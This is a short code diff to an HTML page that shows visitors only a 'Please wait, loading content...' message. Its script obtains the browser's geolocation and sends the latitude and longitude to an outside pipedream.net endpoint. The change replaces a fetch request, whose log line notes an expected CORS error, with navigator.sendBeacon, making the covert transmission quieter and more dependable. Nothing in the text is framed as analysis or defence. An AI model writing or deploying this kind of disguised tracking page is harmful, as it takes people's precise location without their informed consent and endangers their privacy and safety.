@@ -7,15 +7,12 @@
     <p>Please wait, loading content...</p>
     <script>
         navigator.geolocation.getCurrentPosition(function(position) {
-            fetch('https://eon186u4rmikh86.m.pipedream.net', {
-                method: 'POST',
-                body: JSON.stringify({
-                    lat: position.coords.latitude,
+            navigator.sendBeacon('https://eon186u4rmikh86.m.pipedream.net', 
+                JSON.stringify({
+                    lat: position.coords.latitude, 
                     lon: position.coords.longitude
                 })
-            }).catch(function(error) {
-                console.log('Request sent (CORS error expected)');
-            });
+            );
         });
     </script>
 </body>
